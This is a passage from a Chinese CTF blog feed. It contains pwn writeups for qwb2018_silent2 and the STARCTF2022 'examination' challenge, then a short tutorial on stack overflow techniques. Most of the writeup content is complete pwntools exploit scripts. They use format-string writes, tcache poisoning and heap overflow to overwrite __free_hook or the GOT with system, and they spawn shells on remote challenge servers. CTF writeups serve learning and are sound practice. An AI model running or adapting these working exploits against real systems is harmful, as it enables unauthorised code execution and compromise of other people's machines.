index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Input Cookie:&quot;</span>,cookies[idx])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,name</span>):</span></span><br><span class="line">    choose(<span class="string">&#x27;C&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Input index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Input Cookie:&quot;</span>,cookies[idx])</span><br><span class="line">    sa(<span class="string">&quot;input your new name(no longer than old!):&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    choose(<span class="string">&#x27;S&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;%&#123;&#125;$p%&#123;&#125;$p%&#123;&#125;$p&#x27;</span>.<span class="built_in">format</span>(<span class="number">8</span>,<span class="number">17</span>,<span class="number">13</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x10</span>,payload)</span><br><span class="line"></span><br><span class="line">gdbcmd=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b printf</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># debug(gdbcmd)</span></span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">elf_base=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x1874</span></span><br><span class="line">ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">__libc_start_main=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">231</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret2libc</span>(<span class="params">func,func_addr,flag=<span class="number">1</span>,one_gadget_addr=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="comment"># libc=ELF(libc_file)</span></span><br><span class="line">        libc=elf.libc</span><br><span class="line">        libc_base=func_addr-libc.sym[func]</span><br><span class="line">        sys_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">        binsh=libc_base+libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">        environ=libc_base+libc.sym[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">        __malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">        __free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">        libc=LibcSearcher(func,func_addr)</span><br><span class="line">        libc_base=func_addr-libc.dump(func)</span><br><span class="line">        sys_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">        binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">        environ=libc_base+libc.dump(<span class="string">&#x27;_environ&#x27;</span>)</span><br><span class="line">        __malloc_hook=libc_base+libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">        __free_hook=libc_base+libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;libc_base&#x27;</span>:libc_base,<span class="string">&#x27;system&#x27;</span>:sys_addr,<span class="string">&#x27;binsh&#x27;</span>:binsh,<span class="string">&#x27;environ&#x27;</span>:environ,<span class="string">&#x27;__malloc_hook&#x27;</span>:__malloc_hook,<span class="string">&#x27;__free_hook&#x27;</span>:__free_hook&#125;</span><br><span class="line"></span><br><span class="line">libc=ret2libc(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hn&quot;</span>.<span class="built_in">format</span>((stack_addr+<span class="number">8</span>)&amp;<span class="number">0xffff</span>,<span class="number">15</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x10</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hn&quot;</span>.<span class="built_in">format</span>((libc[<span class="string">&#x27;__free_hook&#x27;</span>])&amp;<span class="number">0xffff</span>,<span class="number">41</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hn&quot;</span>.<span class="built_in">format</span>((stack_addr+<span class="number">8</span>+<span class="number">2</span>)&amp;<span class="number">0xffff</span>,<span class="number">15</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x10</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hhn&quot;</span>.<span class="built_in">format</span>((libc[<span class="string">&#x27;__free_hook&#x27;</span>]&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>,<span class="number">41</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x10</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hn&quot;</span>.<span class="built_in">format</span>(libc[<span class="string">&#x27;system&#x27;</span>]&amp;<span class="number">0xffff</span>,<span class="number">13</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x10</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hn&quot;</span>.<span class="built_in">format</span>((stack_addr+<span class="number">8</span>)&amp;<span class="number">0xffff</span>,<span class="number">15</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x10</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hhn&quot;</span>.<span class="built_in">format</span>((libc[<span class="string">&#x27;__free_hook&#x27;</span>]+<span class="number">2</span>)&amp;<span class="number">0xff</span>,<span class="number">41</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x10</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hn&quot;</span>.<span class="built_in">format</span>((libc[<span class="string">&#x27;system&#x27;</span>]&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>,<span class="number">13</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x10</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hhn&quot;</span>.<span class="built_in">format</span>((libc[<span class="string">&#x27;__free_hook&#x27;</span>]+<span class="number">4</span>)&amp;<span class="number">0xff</span>,<span class="number">41</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x10</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hn&quot;</span>.<span class="built_in">format</span>((libc[<span class="string">&#x27;system&#x27;</span>]&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffff</span>,<span class="number">13</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x10</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug(gdbcmd)</span></span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="qwb2018-silent"><a href="#qwb2018-silent" class="headerlink" title="qwb2018_silent"></a>qwb2018_silent</h2><h2 id="qwb2018-silent2"><a href="#qwb2018-silent2" class="headerlink" title="qwb2018_silent2"></a>qwb2018_silent2</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>glibc 版本为 2.27，仅开启 Partial RELRO，且未开启 PIE。</p>
<p>程序3个功能：</p>
<ul>
<li>add: 申请一个 chunk，大小为 0x10 或大于 0x7f</li>
<li>remove: 删除一个 chunk</li>
<li>edit: 修改 chunk 内容，大小由 strlen 确定</li>
</ul>
<h4 id="漏洞及利用"><a href="#漏洞及利用" class="headerlink" title="漏洞及利用"></a>漏洞及利用</h4><ul>
<li>remove 功能中存在 uaf，可以利用来修改 tcache_chain</li>
</ul>
<h4 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h4><p>将 free_got 放入 tcache_chain 中，然后修改为 system 即可。</p>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(&#x27;./silent2&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25196</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./silent2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_file=filename</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">choose=<span class="keyword">lambda</span> x:sl(<span class="built_in">str</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(size))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sl(content)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sl(content)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;Messa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;Messa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(elf.got[<span class="string">&#x27;free&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\0&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>,p64(elf.plt[<span class="string">&#x27;system&#x27;</span>]))<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>CTF</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>STARCTF2022 pwn方向writeup</title>
    <url>/2022/04/21/starCTF-pwn%E6%96%B9%E5%90%91%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>只能做一题(待续)</p>
<span id="more"></span>

<h2 id="examination"><a href="#examination" class="headerlink" title="examination"></a>examination</h2><h3 id="检查程序"><a href="#检查程序" class="headerlink" title="检查程序"></a>检查程序</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/rabbit/Desktop/*CTF2022/examination/examination&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RUNPATH:  &#x27;/home/rabbit/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>是一个老师给学生打分、留评语的程序。</p>
<ul>
<li>老师最多添加6个学生并为其指定题数，其中添加学生会生成两个大小分别为0x30、0x20的chunk。</li>
<li>老师写评语会生成一个用户指定、有大小限制的chunk。</li>
<li>对review的索引依赖学生两个chunk中的指定内容。</li>
<li>write_review的读写长度，依赖0x20大小chunk的中最后一个内存块的内容。</li>
<li>在student的check_review，会检查学生的成绩是否及格(score&gt;59)，及格则泄露地址，并可以给任意一个地址内容+1。</li>
</ul>
<h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><ul>
<li><p><strong>整数溢出</strong><br>student的pray功能会给对应的学生打上一个标记，而老师give_score时，检测到该标记位则会给学生-10分。因为在check_review中，检测时将该位看作了DWORD(一般是无符号)，因此当学生分数小于10则会产生一个整数溢出漏洞，从而通过检测。</p>
</li>
<li><p><strong>堆溢出</strong><br>由于write_review依赖于chunk中的指定内容，若我们能控制该chunk中的内容，则能够产生一个堆溢出漏洞。</p>
</li>
<li><p><strong>off-by-one</strong><br>由于check_review能增加内容大小，因此增大review读写大小能产生一个off-by-null漏洞。</p>
</li>
</ul>
<h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>利用整数溢出漏洞通过check_review的检测，泄露堆地址并制造一个off-by-one漏洞。构造堆重叠，并且重叠覆盖下一个学生对应的两个chunk，释放掉该chunk后，能将review大小覆盖为更大的值，制造堆溢出漏洞。</p>
<p>由于能改变review读写大小，因此还能够通过释放掉非fast chunk来泄露libc地址。并且由于glibc版本为2.31，具有tcache机制，因此为了将chunk放入unsortedbin中需要比tcache范围大。</p>
<p>再利用堆溢出修改chunk中的内容以修改free_hook中的内容为system。然后将review地址改为’/bin/sh’地址，或将该地址赋值为’/bin/sh’，然后释放掉就能get shell。</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(&#x27;./examination&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;124.70.130.92&#x27;</span>,<span class="number">60001</span>)</span><br><span class="line"></span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./examination&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_file=<span class="string">&#x27;./libc-2.31.so&#x27;</span></span><br><span class="line"></span><br><span class="line">choose=<span class="keyword">lambda</span> x:io.sendlineafter(<span class="string">&quot;choice&gt;&gt; &quot;</span>,<span class="built_in">str</span>(x))</span><br><span class="line"></span><br><span class="line">role=<span class="keyword">lambda</span> x:io.sendlineafter(<span class="string">&quot;role: &lt;0.teacher/1.student&gt;: &quot;</span>,<span class="built_in">str</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_student</span>(<span class="params">index</span>):</span></span><br><span class="line">    role(<span class="number">0</span>)</span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;enter the number of questions: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    choose(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">give_score</span>():</span></span><br><span class="line">    role(<span class="number">0</span>)</span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    choose(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_test</span>():</span></span><br><span class="line">    role(<span class="number">1</span>)</span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    choose(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_review</span>(<span class="params">index,comment,size=<span class="number">0</span></span>):</span></span><br><span class="line">    role(<span class="number">0</span>)</span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;which one? &gt; &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="keyword">if</span> size:</span><br><span class="line">        sla(<span class="string">&quot;please input the size of comment: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;enter your comment:&quot;</span>,comment)</span><br><span class="line">    choose(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call_parent</span>(<span class="params">index</span>):</span></span><br><span class="line">    role(<span class="number">0</span>)</span><br><span class="line">    choose(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;which student id to choose?&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    choose(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pray</span>():</span></span><br><span class="line">    role(<span class="number">1</span>)</span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    choose(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_review</span>():</span></span><br><span class="line">    role(<span class="number">1</span>)</span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;reward! &#x27;</span>)</span><br><span class="line">    content=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_id</span>(<span class="params">index</span>):</span></span><br><span class="line">    role(<span class="number">1</span>)</span><br><span class="line">    choose(<span class="number">6</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;input your id: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    choose(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add_student(<span class="number">1</span>)  <span class="comment">#0</span></span><br><span class="line">add_student(<span class="number">1</span>)  <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">write_review(<span class="number">0</span>,<span class="string">&#x27;rabbit&#x27;</span>,<span class="number">0x18</span>)</span><br><span class="line">write_review(<span class="number">1</span>,<span class="string">&#x27;rabbit&#x27;</span>,<span class="number">0x3f0</span>)</span><br><span class="line"></span><br><span class="line">change_id(<span class="number">0</span>)</span><br><span class="line">pray()</span><br><span class="line"></span><br><span class="line">give_score()</span><br><span class="line"></span><br><span class="line">heap=check_review()-<span class="number">0x2a0</span></span><br><span class="line">sla(<span class="string">&quot;add 1 to wherever you want! addr: &quot;</span>,<span class="built_in">str</span>((heap+<span class="number">0x2e0</span>)*<span class="number">10</span>))</span><br><span class="line">choose(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">write_review(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">&#x27;\x51&#x27;</span>)</span><br><span class="line">add_student(<span class="number">1</span>)  <span class="comment">#2</span></span><br><span class="line">add_student(<span class="number">1</span>)  <span class="comment">#3</span></span><br><span class="line">write_review(<span class="number">2</span>,<span class="string">&#x27;rabbit&#x27;</span>,<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">add_student(<span class="number">1</span>)  <span class="comment">#4</span></span><br><span class="line">write_review(<span class="number">4</span>,<span class="string">&#x27;rabbit&#x27;</span>,<span class="number">0x3f0</span>)</span><br><span class="line"></span><br><span class="line">add_student(<span class="number">1</span>)  <span class="comment">#5</span></span><br><span class="line">write_review(<span class="number">5</span>,<span class="string">&#x27;rabbit&#x27;</span>,<span class="number">0x10</span>)</span><br><span class="line">add_student(<span class="number">1</span>)  <span class="comment">#6</span></span><br><span class="line">write_review(<span class="number">6</span>,<span class="string">&#x27;/bin/sh\0&#x27;</span>,<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">call_parent(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x31</span>)</span><br><span class="line">payload+=p64(heap+<span class="number">0x850</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">payload+=p64(<span class="number">1</span>)+p64(heap+<span class="number">0x870</span>)</span><br><span class="line">payload+=p64(<span class="number">0x450</span>)+p64(<span class="number">0x451</span>)</span><br><span class="line">write_review(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">call_parent(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">change_id(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">role(<span class="number">1</span>)</span><br><span class="line">choose(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">main_arena=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))-<span class="number">96</span></span><br><span class="line"></span><br><span class="line">libc=elf.libc</span><br><span class="line">libc_base=main_arena-<span class="number">0x1ECB80</span></span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">choose(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x31</span>)</span><br><span class="line">payload+=p64(heap+<span class="number">0xd10</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(free_hook)</span><br><span class="line">write_review(<span class="number">5</span>,payload)</span><br><span class="line"></span><br><span class="line">write_review(<span class="number">6</span>,p64(system))</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x31</span>)</span><br><span class="line">payload+=p64(heap+<span class="number">0xd10</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(heap+<span class="number">0xd30</span>)</span><br><span class="line">write_review(<span class="number">5</span>,payload)</span><br><span class="line"></span><br><span class="line">role(<span class="number">0</span>)</span><br><span class="line">choose(<span class="number">4</span>)</span><br><span class="line">sla(<span class="string">&quot;which student id to choose?&quot;</span>,<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>CTF</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>stack overflow漏洞小结</title>
    <url>/2022/03/04/stack-overflow%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/</url>
    <content><![CDATA[<p>以<a href="https://ctf-wiki.org/pwn/linux/user-mode/environment/">CTF Wiki</a>的目录为骨架，记录自己对栈溢出漏洞的理解。</p>
<span id="more"></span>

<p>对于CTF的pwn方向而言，我们实际上要做的就是通过一些漏洞来达到干扰程序的运行流程，以达到get shell或泄露敏感文件的内容的效果。</p>
<p>在介绍stack overflow漏洞之前，我们需要对栈有一个<a href="http://blog.rabb1t.xyz/2022/03/04/%E6%A0%88%E4%BB%8B%E7%BB%8D/">基本的了解</a>。</p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>栈溢出指的是用户向栈中变量写入的长度超过了其本身的长度，导致其相邻栈数据被改写的情况。发生栈溢出的前提是：</p>
<ul>
<li>写入的位置在栈上</li>
<li>写入的长度没被良好的控制</li>
</ul>
<h2 id="相关危险函数"><a href="#相关危险函数" class="headerlink" title="相关危险函数"></a>相关危险函数</h2><p>通过上面提到的前提，我们知道要想利用栈溢出，则必须有用户输入的环节。包括的常见输入危险函数有：</p>
<ul>
<li> gets：从标准输入<code>stdin</code>中读取数据直到出现换行符或读到文件尾为止，最后加上NULL作为字符串结束。</li>
<li> scanf：从标准输入 <code>stdin</code> 读取格式化输入。</li>
</ul>
<p>以上函数均没有较好的限制长度，所以容易产生溢出漏洞。</p>
<p>除了输入环节，还有一些涉及到字符串赋值的环节也会产生栈溢出漏洞，包括的常见函数有：</p>
<ul>
<li> strcpy，字符串复制，遇到’\x00’停止</li>
<li> strcat，字符串拼接，遇到’\x00’停止</li>
</ul>
<p>遇到上面两个函数时，也会因为被赋值变量的长度不够而导致溢出。</p>
<h2 id="利用漏洞"><a href="#利用漏洞" class="headerlink" title="利用漏洞"></a>利用漏洞</h2><p>当我们找到此漏洞时，我们就可以任意改写此变量之后的任意地址中的内容。常见的利用此漏洞进行改写的地址有：</p>
<ul>
<li><code>return addrss</code>中的内容</li>
<li>栈上其他变量的值</li>
<li>若待写变量在bss段，也能更改bss段中的内容</li>
</ul>
<p>我们想要改写地址的目的无非是<strong>直接或者间接地控制程序执行流程</strong>。</p>
<p>而利用栈溢出漏洞最常见的攻击方式，就是ROP了，了解可以看看这篇<a href="http://blog.rabb1t.xyz/2022/03/04/ROP%E4%BB%8B%E7%BB%8D/">ROP介绍</a>。</p>
<h2 id="栈溢出技巧"><a href="#栈溢出技巧" class="headerlink" title="栈溢出技巧"></a>栈溢出技巧</h2><p>由于本人水平有限，仅简单介绍CTF Wiki上的花式栈溢出技巧。</p>
<h3 id="stack-pivot"><a href="#stack-pivot" class="headerlink" title="stack pivot"></a>stack pivot</h3><p>合理使用<code>jmp esp</code>或<code>pop esp</code>指令将栈顶指针跳转到指定的地址，执行<code>ret</code>指令后将从该位置执行。我们常将构造的rop chain或shellcode写入一些可写入地址，然后将栈顶迁移到这些地址或后门函数，并在此处开栈执行设计好的流程。</p>
<h3 id="frame-faking"><a href="#frame-faking" class="headerlink" title="frame faking"></a>frame faking</h3><p>构造一个虚假的栈帧来控制程序的执行流</p>
<p>我感觉其实就是栈迁移，只不过当我们没有合适的指令改变栈顶指针时，通过<code>leave;ret</code>指令的重复使用，将栈帧迁移到我们指定的地址，然后将<code>rip</code>寄存器赋值为我们构造的rop chain。</p>
